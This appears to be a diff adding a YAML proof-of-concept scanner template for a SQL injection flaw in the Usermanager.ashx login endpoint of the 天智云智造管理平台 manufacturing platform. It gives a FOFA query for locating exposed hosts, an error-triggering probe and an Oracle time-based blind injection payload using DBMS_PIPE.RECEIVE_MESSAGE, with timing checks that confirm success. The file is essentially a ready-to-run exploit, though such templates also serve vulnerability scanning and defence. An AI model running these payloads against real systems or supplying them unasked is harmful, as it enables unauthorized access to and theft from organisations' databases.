@@ -1,0 +1,26 @@
+id: poc-yaml-tian-zhi-yun-usermanager-ashx-sqli
+info:
+  name: 天智云智造管理平台 Usermanager.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 天智云智造管理平台
+  fofa: body="Ashx/Usermanager.ashx"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /Ashx/Usermanager.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: type=LOGIN&username=1')
+  expression: status_code == 200 && contains(body,"SQL 命令未正确结束")
+- method: POST
+  path: /Ashx/Usermanager.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: type=LOGIN&username=1') AND 8645=DBMS_PIPE.RECEIVE_MESSAGE(CHR(110),{{.t1}})--&pwd=1&vendor=
+  expression: "status_code == 200 && \ncontains(body,\"用户名或者密码错误\") &&\nduration >\
+    \ t1 &&\nduration < t2\n"
+transport: http
